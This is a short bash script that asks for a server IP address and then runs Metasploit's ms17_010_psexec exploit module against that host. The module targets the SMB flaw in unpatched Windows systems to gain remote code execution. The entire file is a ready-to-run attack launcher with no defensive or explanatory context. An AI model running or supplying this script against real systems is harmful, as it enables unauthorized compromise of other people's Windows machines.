#!/bin/bash

echo "enter server ip: "
read lip

msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set RHOST $lip; exploit"

